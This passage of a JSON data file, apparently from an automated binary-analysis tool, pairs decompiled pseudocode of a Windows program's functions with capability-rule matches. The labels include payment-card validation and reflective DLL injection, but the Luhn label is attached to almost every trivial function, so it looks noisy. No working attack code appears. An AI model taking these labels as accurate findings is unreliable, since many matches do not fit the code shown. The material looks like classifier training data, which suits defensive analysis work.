        "decompiled_code": "\nvoid __cdecl fcn.00421b18(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint var_5ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = &fcn.00421b18::var_5ch;\n    for (iVar1 = 0x15; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar2 = puVar2 + 1;\n    }\n    puStack112 = 0x421b3d;\n    fcn.004220fc();\n    var_4h = 0;\n    var_8h = 0;\n    uStack116 = 0x421ba7;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    iVar1 = in_ECX;\n    if (in_ECX != *0x46388c) {\n        puStack112 = &stack0xfffffffc;\n        iVar1 = fcn.00421714();\n    }\n    var_8h = iVar1;\n    var_4h = fcn.004210b0(*(in_EAX + 0x2c), &fcn.00421b18::var_5ch);\n    uVar3 = 0;\n    fcn.004223cc(0, *(in_EAX + 0x28) & 0xffffff00 | *(*(in_EAX + 0x28) + 0x70), &fcn.00421b18::var_5ch);\n    *in_FS_OFFSET = uVar3;\n    return;\n}\n",
        "token_count": 445
    },
    "00421bd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421bd8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    fcn.00421ecc();\n    iVar1 = *(in_EAX + 0x28);\n    *(iVar1 + 0x50) = 0;\n    *(iVar1 + 0x54) = 0;\n    fcn.0040cf1c();\n    return;\n}\n",
        "token_count": 92
    },
    "00421c08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.00421c08(void)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    uint *arg_8h;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    \n    arg_8h = fcn.00403228();\n    (**(*in_EAX + 0x58))();\n    uVar4 = (***arg_8h)();\n    fcn.00415840(uVar4, uVar4 >> 0x20);\n    puVar3 = in_EAX[10] + 0x18;\n    puVar1 = &stack0xffffff98;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar1 = puVar1 + 1;\n    }\n    fcn.004220fc();\n    fcn.0040cf1c();\n    fcn.004223cc(arg_8h, in_EAX[10] & 0xffffff00U | *(in_EAX[10] + 0x70), &stack0xffffff98);\n    return;\n}\n",
        "token_count": 273
    },
    "00422a5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422a5c(int32_t param_1)\n\n{\n    int16_t aiStack112 [7];\n    uchar auStack98 [86];\n    \n    fcn.004220fc();\n    if (param_1 == 0) {\n        fcn.00402c64();\n        fcn.004223cc(0, 0, auStack98);\n    }\n    else {\n        fcn.004159e8();\n        if (aiStack112[0] != 0x4d42) {\n            fcn.0041dadc();\n        }\n        fcn.004224f4(aiStack112);\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "004231dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004231dc(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    ushort *in_EDX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY124;\n    uint uStackY120;\n    uchar *puStackY116;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_4h;\n    \n    *in_EDX = 2;\n    fcn.0042210c();\n    puVar3 = *(in_EAX + 0x28) + 0x18;\n    puVar4 = &fcn.004231dc::var_58h;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_40h = 0;\n    var_44h = 0;\n    puStackY116 = 0x423229;\n    uVar1 = fcn.004210b0(*(in_EAX + 0x2c), &fcn.004231dc::var_58h);\n    *var_4h = uVar1;\n    uStackY120 = 0x423256;\n    uStackY124 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff84;\n    puStackY116 = &stack0xfffffffc;\n    uVar1 = fcn.00421714();\n    *arg_8h = uVar1;\n    *in_FS_OFFSET = uStackY124;\n    return;\n}\n",
        "token_count": 400
    },
    "004232c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004232c4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ed7c();\n    *(in_EAX + 0x21) = 1;\n    uVar1 = fcn.00403228();\n    *(in_EAX + 0x28) = uVar1;\n    fcn.00420edc();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 194
    },
    "00423568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00423568(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    puStack32 = 0x423581;\n    piVar1 = fcn.00403228();\n    uStack36 = 0x4235f6;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar2 = (***param_2)();\n    fcn.004157bc(uVar2);\n    (**(*piVar1 + 4))();\n    (***piVar1)();\n    fcn.004159e8();\n    fcn.004159e8();\n    if (1 < var_ah._2_2_) {\n        fcn.0041dae8();\n    }\n    fcn.00423620();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x423616;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 295
    },
    "004237b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.004237b8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar uStack32;\n    \n    uVar3 = 1;\n    uStack68 = 0;\n    uStack72 = 0x4237c6;\n    iVar1 = sub.user32.dll_GetDC();\n    if (iVar1 != 0) {\n        uStack72 = *0x4638a0;\n        iStack76 = iVar1;\n        iVar2 = sub.gdi32.dll_SelectObject();\n        if (iVar2 != 0) {\n            iVar2 = sub.gdi32.dll_GetTextMetricsA(iVar1, &stack0xffffffb4);\n            if (iVar2 != 0) {\n                uVar3 = uStack32;\n            }\n        }\n        sub.user32.dll_ReleaseDC(0, iVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 221
    },
    "004238c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004238c8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 136
    },
    "0042392c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042392c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 41
    },
    "00423938": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00423938(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 41
    },
    "00423af8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00423af8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint *var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_ch = *(in_EAX + 4);\n    if (var_ch == NULL) {\n        return;\n    }\n    uStack20 = 0x423b14;\n    var_8h = var_ch;\n    var_4h = in_EAX;\n    fcn.0042392c();\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *(var_4h + 4) = *var_ch;\n    *in_FS_OFFSET = uStack28;\n    uStack20 = 0x423b4a;\n    uStack24 = 0x423b42;\n    fcn.00423938();\n    return;\n}\n",
        "token_count": 220
    },
    "00423ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00423ef0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    *(in_EAX + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 149
    },
    "00423f8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00423f8c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    uVar1 = fcn.00403228();\n    *(in_EAX + 4) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "00424dd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00424dd4(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00405660();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 130
    },
    "00424e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00424e10(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    uVar1 = fcn.00423ef0();\n    *(in_EAX + 0x10) = uVar1;\n    uVar1 = fcn.00423ef0();\n    *(in_EAX + 0x14) = uVar1;\n    uVar1 = fcn.00423ef0();\n    *(in_EAX + 0x18) = uVar1;\n    fcn.00403fa8();\n    *(in_EAX + 0x1c) = 1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 252
    },
    "004255ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004255ec(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x4256c7;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00403ffc();\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (iVar3 == 0) {\n        fcn.0040b5f4();\n        fcn.004039e4();\n    }\n    else if (-1 < iVar3 + -1) {\n        do {\n            fcn.00423f2c();\n            fcn.00405660();\n            fcn.0040568c();\n            cVar2 = (**(_pe_dos_header + 0x30))();\n            if (cVar2 != '\\0') {\n                fcn.0040568c();\n                (**(_pe_dos_header + 0x34))();\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4256ce;\n    uStack40 = 0x4256be;\n    fcn.00404a30();\n    uStack40 = 0x4256c6;\n    fcn.00405648();\n    return;\n}\n",
        "token_count": 437
    },
    "00425d9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00425d9c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = in_EAX + 4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 145
    },
    "00427130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427130(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar auStack28 [4];\n    int32_t iStack24;\n    \n    sub.user32.dll_GetWindowRect();\n    if (*(**0x462098 + 0x44) == 0) {\n        fcn.00456f10();\n    }\n    else if (*(**0x4621e4 + 0x6c) == 0) {\n        fcn.004534b0();\n    }\n    else {\n        fcn.004534b0();\n    }\n    iVar1 = fcn.00456c14(0, 0, 0x15);\n    iVar2 = fcn.00456bf8();\n    fcn.00456be0(iVar1 + (auStack28 + (iVar2 - iStack24)) / 3);\n    fcn.00456c2c();\n    sub.user32.dll_SetWindowPos();\n    return;\n}\n",
        "token_count": 215
    },
    "0042724c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042724c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    code **in_FS_OFFSET;\n    code *pcVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041951c();\n    *(in_EAX + 0x30) = 1;\n    pcVar2 = fcn.00427328;\n    uVar1 = fcn.0041a5ac(fcn.00427328, in_EAX);\n    *(in_EAX + 0x40) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = pcVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 209
    },
    "004273c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004273c0(uint param_1, code *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint extraout_var;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = 0x4273d4;\n    sub.user32.dll_GetActiveWindow();\n    puStack40 = 0x4273de;\n    fcn.004502fc();\n    puStack40 = 0x4273e6;\n    fcn.00450218();\n    uStack44 = 0x427483;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.004591f4(*(*in_EAX + 0x34), in_EAX);\n    *in_FS_OFFSET = &stack0xffffffbc;\n    *0x461724 = in_EAX;\n    (*param_2)();\n    *in_FS_OFFSET = extraout_var;\n    fcn.00459250(*(*in_EAX + 0x34), in_EAX);\n    return;\n}\n",
        "token_count": 294
    },
    "00427540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00427540(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0042724c();\n    uVar1 = fcn.00403228();\n    *(in_EAX + 0x58) = uVar1;\n    *(in_EAX + 0x5c) = *0x4275b4;\n    *(in_EAX + 0xb0) = *0x4275b8;\n    uVar1 = fcn.00403228();\n    *(in_EAX + 0x7c) = uVar1;\n    *(in_EAX + 100) = 1;\n    *(in_EAX + 0x80) = 0;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 266
    },
    "00427f20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427f20(void)\n\n{\n    uint uVar1;\n    \n    *0x463a6c = sub.user32.dll_RegisterWindowMessageA(0x427f84);\n    *0x463a70 = sub.user32.dll_RegisterWindowMessageA(0x427f94);\n    uVar1 = 1;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    uVar1 = fcn.00408c38(uVar1);\n    *0x461728 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    return;\n}\n",
        "token_count": 124
    },
    "00429a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429a10(uint arg_8h)\n\n{\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0041cddc();\n    fcn.0041d564();\n    fcn.0041cddc();\n    fcn.0041d564();\n    return;\n}\n",
        "token_count": 129
    },
    "00429ad4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429ad4(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint lprc;\n    \n    fcn.0041cee8();\n    *(in_EDX + 0xc) = *(in_EDX + 0xc) + -1;\n    *(in_EDX + 8) = *(in_EDX + 8) + -1;\n    if (0 < arg_8h) {\n        do {\n            arg_8h = arg_8h + -1;\n            fcn.00429a10(&stack0xfffffffc);\n            sub.user32.dll_InflateRect();\n        } while (0 < arg_8h);\n    }\n    *(in_EDX + 0xc) = *(in_EDX + 0xc) + 1;\n    *(in_EDX + 8) = *(in_EDX + 8) + 1;\n    return;\n}\n",
        "token_count": 216
    },
    "00429d44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00429d44(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY52;\n    uint uStackY48;\n    uchar *puStackY44;\n    uint var_18h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1c) & 0x10) != 0) {\n        fcn.0041ceb8();\n        fcn.0041d1d8();\n        puStackY44 = 0x429d8d;\n        fcn.0041d59c(*(in_EAX + 0x4c), *(in_EAX + 0x48));\n    }\n    uVar1 = *(in_EAX + 0x17c);\n    *(in_EAX + 0x17c) = 1;\n    uStackY48 = 0x429df5;\n    uStackY52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStackY44 = &stack0xfffffffc;\n    fcn.00429c18();\n    fcn.0041d5e4();\n    *in_FS_OFFSET = uStackY52;\n    *(in_EAX + 0x17c) = uVar1;\n    return;\n}\n",
        "token_count": 293
    },
    "0042a2dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042a2dc(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0044191c();\n    *(in_EAX + 0x50) = *0x42a394;\n    fcn.0042f140();\n    cVar1 = fcn.0042f220();\n    if (cVar1 != '\\0') {\n        *(in_EAX + 0x50) = ~*0x42a39c & (*(in_EAX + 0x50) | *0x42a398);\n    }\n    fcn.00438ce8();\n    fcn.00438d0c();\n    *(in_EAX + 0x220) = 2;\n    fcn.0042a72c();\n    fcn.0042a748();\n    *(in_EAX + 0x21c) = 0;\n    fcn.004396cc();\n    *(in_EAX + 0x21d) = 1;\n    fcn.0043ff9c();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 338
    },
    "0042a588": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042a588(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x42a6ea;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    (**(*in_EAX + 0x44))();\n    if (*(in_EAX + 0x212) != '\\0') {\n        fcn.0042a550(&stack0xfffffffc);\n        fcn.00429ad4(in_EAX[0x85]);\n    }\n    fcn.00429ad4(in_EAX[0x86]);\n    if (*(in_EAX + 0x211) != '\\0') {\n        fcn.0042a550(&stack0xfffffffc);\n        fcn.00429ad4(in_EAX[0x85]);\n    }\n    fcn.0042f140();\n    cVar1 = fcn.0042f220();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00440e54();\n        if (cVar1 != '\\0') goto code_r0x0042a659;\n    }\n    fcn.0041d0bc();\n    fcn.0041d460();\ncode_r0x0042a659:\n    fcn.0041d1d8();\n    fcn.0041d724();\n    iVar2 = fcn.0041d680();\n    uVar4 = (var_ch + var_14h) - iVar2;\n    var_14h = uVar4 >> 1;\n    if (var_14h < 0) {\n        var_14h = var_14h + ((uVar4 & 1) != 0);\n    }\n    var_ch = iVar2 + var_14h;\n    uVar3 = fcn.0043b800();\n    fcn.0043952c(0xffffffff, &var_18h, uVar3);\n    uVar3 = fcn.00404468();\n    uVar3 = fcn.0041d804(uVar3);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar3;\n    fcn.00403fa8(0x42a6f1);\n    return;\n}\n",
        "token_count": 602
    },
    "0042beb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042beb8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040357c();\n        in_DL = extraout_DL;\n    }\n    fcn.004464f4(arg_8h);\n    uVar1 = fcn.00403228();\n    *(in_EAX + 0x80) = uVar1;\n    if (in_DL != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = arg_8h;\n    }\n    return in_EAX;\n}\n",
        "token_count": 166
    },
    "0042bfe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042bfe4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    uVar1 = fcn.00403228();\n    *(in_EAX + 4) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "0042ce34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0042ce34(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h, uint arg_18h, uint arg_1ch, \n            uint32_t arg_20h, uint arg_24h, uint32_t arg_28h)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar1 = fcn.0042cb08(arg_ch, arg_8h, &var_ch, arg_18h, arg_1ch, arg_28h & 0xffffff00 | arg_20h & 0xff, arg_24h, \n                         arg_28h);\n    fcn.0042c8c4(uVar1 & 0xffffff00 | arg_10h & 0xff, uVar1 & 0xffffff00 | arg_14h & 0xff);\n    fcn.0042ca28(arg_ch, arg_8h & 0xffffff00 | arg_14h & 0xff, arg_8h);\n    return;\n}\n",
        "token_count": 247
    },
    "0042dba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dba8(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint in_EDX;\n    uint arg_10h;\n    uint *arg_8h_00;\n    uint var_10h;\n    \n    piVar1 = fcn.0042d758();\n    (**(*piVar1 + 0x40))();\n    (**(*piVar1 + 0x34))();\n    fcn.00421f4c();\n    fcn.0041d0bc();\n    uVar2 = (**(*piVar1 + 0x20))();\n    arg_8h_00 = &var_10h;\n    (**(*piVar1 + 0x2c))();\n    fcn.00412730(arg_8h_00, uVar2);\n    fcn.00421f4c(&var_10h);\n    fcn.0041d460();\n    arg_10h = 0;\n    uVar2 = 1;\n    fcn.00421f4c();\n    fcn.0044707c(uVar2, in_EDX, arg_10h);\n    return;\n}\n",
        "token_count": 262
    },
    "0042dcd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042dcd8(void)\n\n{\n    char cVar1;\n    \n    cVar1 = '\\v';\n    do {\n        fcn.00403258();\n        cVar1 = cVar1 + -1;\n    } while (cVar1 != '\\0');\n    return;\n}\n",
        "token_count": 66
    },
    "0042e124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
